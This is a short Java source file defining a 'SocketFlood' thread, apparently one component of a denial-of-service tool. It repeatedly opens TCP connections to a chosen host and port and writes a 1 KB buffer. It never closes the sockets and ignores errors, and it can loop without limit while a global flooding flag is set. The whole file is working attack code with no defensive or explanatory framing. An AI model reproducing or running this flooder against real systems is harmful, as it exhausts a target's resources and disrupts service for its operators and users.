import java.net.Socket;
import java.io.IOException;

class SocketFlood extends Thread {

	private String host;
	private int port;
	private int connections;
	private int delay;

	private int count = 0;

	public SocketFlood(String host, int port, int connections, int delay) {
		this.host = host;
		this.port = port;
		this.connections = connections;
		this.delay = delay;
		this.start();
	}

	public void run() {
		while(FloodingStatus.socketFlooding && (this.count < this.connections || this.connections == 0)) {
			try {
				Socket socket = new Socket(this.host, this.port);
				byte[] buffer = new byte[1024];
				socket.getOutputStream().write(buffer, 0, buffer.length);
				buffer = null;
				socket = null;
				count++;
			} catch(IOException ioe) {
			} finally {
				try {
					this.sleep(this.delay);
				} catch(InterruptedException ie) {
				}
			}
		}
	}

}